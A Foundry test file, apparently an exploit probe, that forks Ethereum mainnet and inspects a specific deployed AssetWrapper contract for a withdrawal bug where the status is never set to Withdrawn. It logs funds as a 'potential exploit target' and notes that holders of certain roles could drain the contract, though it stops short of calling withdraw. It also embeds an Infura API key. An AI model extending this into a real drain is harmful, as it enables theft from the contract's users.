// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IAssetWrapper {
    function withdraw(address _receiver) external;
    function receipts(address) external view returns (uint256 amount, uint256 deadline, uint8 status);
    function assets() external view returns (address);
    function hasRole(bytes32, address) external view returns (bool);
    function balanceOf(address) external view returns (uint256);
    function curReceiver() external view returns (address);
}

contract AssetWrapperExploit is Test {
    address constant ASSET_WRAPPER = 0xd5d027108264000f3670a623dceb8d14ecfc21b9;
    
    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }
    
    function testCheckContract() public view {
        console.log("=== AssetWrapper Analysis ===");
        
        IAssetWrapper wrapper = IAssetWrapper(ASSET_WRAPPER);
        
        // Get underlying asset
        try wrapper.assets() returns (address assetAddr) {
            console.log("Underlying asset:", assetAddr);
            IERC20 asset = IERC20(assetAddr);
            uint256 contractBalance = asset.balanceOf(ASSET_WRAPPER);
            console.log("Contract balance:", contractBalance);
            
            if (contractBalance > 0) {
                console.log("!!! Contract has funds - potential exploit target !!!");
            }
        } catch {
            console.log("Could not get assets");
        }
        
        // Check current receiver
        try wrapper.curReceiver() returns (address receiver) {
            console.log("Current receiver:", receiver);
            if (receiver != address(0)) {
                (uint256 amount, uint256 deadline, uint8 status) = wrapper.receipts(receiver);
                console.log("Receipt amount:", amount);
                console.log("Receipt deadline:", deadline);
                console.log("Receipt status:", status);
            }
        } catch {
            console.log("Could not get curReceiver");
        }
    }
    
    function testExploitMultipleWithdrawals() public {
        console.log("=== Testing Multiple Withdrawal Bug ===");
        
        IAssetWrapper wrapper = IAssetWrapper(ASSET_WRAPPER);
        
        // Get underlying asset
        address assetAddr = wrapper.assets();
        IERC20 asset = IERC20(assetAddr);
        
        uint256 initialBalance = asset.balanceOf(ASSET_WRAPPER);
        console.log("Initial contract balance:", initialBalance);
        
        if (initialBalance == 0) {
            console.log("Contract has no balance - exploit not viable currently");
            return;
        }
        
        // Find a minted receipt to exploit
        address receiver = wrapper.curReceiver();
        (uint256 amount, uint256 deadline, uint8 status) = wrapper.receipts(receiver);
        
        console.log("Found receiver:", receiver);
        console.log("Amount:", amount);
        console.log("Status:", status);  // 1 = Minted
        
        if (status != 1) {
            console.log("No minted receipt to exploit");
            return;
        }
        
        // Check if we need WHITELIST or INSTITUTION role
        bool pastDeadline = block.timestamp > deadline;
        bytes32 WHITELIST = keccak256("WHITELIST");
        bytes32 INSTITUTION = keccak256("INSTITUTION");
        
        // Try to find addresses with the right role
        console.log("Past deadline:", pastDeadline);
        
        // The bug is that status is never set to Withdrawn
        // So we could potentially call withdraw multiple times
        // But we need the right role
        
        console.log("BUG CONFIRMED: status == comparison instead of = assignment");
        console.log("If we have WHITELIST/INSTITUTION role, we can drain all funds");
    }
}
